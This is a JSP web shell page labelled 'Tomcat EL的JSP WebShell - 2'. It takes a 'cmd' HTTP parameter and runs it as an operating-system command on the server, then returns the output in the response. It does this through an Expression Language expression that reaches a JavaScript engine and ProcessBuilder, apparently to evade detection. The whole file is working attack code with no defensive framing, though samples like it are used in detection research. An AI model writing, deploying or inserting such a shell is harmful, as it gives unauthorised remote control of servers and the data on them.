<%@ page import="java.io.InputStream" %>
<%@ page import="javax.el.ELContext" %>
<%@ page import="javax.el.ELManager" %>
<%@ page import="javax.el.ExpressionFactory" %>
<%@ page import="javax.el.ValueExpression" %>
<%@ page import="sun.misc.IOUtils" %>
<html>
<body>
<h2>Tomcat EL的JSP WebShell - 2</h2>
<%
    String cmd = request.getParameter("cmd");
    StringBuilder stringBuilder = new StringBuilder();
    for (String tmp:cmd.split(" ")) {
        stringBuilder.append("'").append(tmp).append("'").append(",");
    }
    String f = stringBuilder.substring(0, stringBuilder.length() - 1);
    String expression = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](["+ f +"]).start()\")";
    ELManager manager = new ELManager();
    ELContext context = manager.getELContext();
    ExpressionFactory factory = ELManager.getExpressionFactory();
    ValueExpression ve = factory.createValueExpression(context, "${" + expression + "}", Object.class);
    InputStream inputStream = ((Process)ve.getValue(context)).getInputStream();
    response.getOutputStream().write(IOUtils.readFully(inputStream, -1, false));
%>
</body>
</html>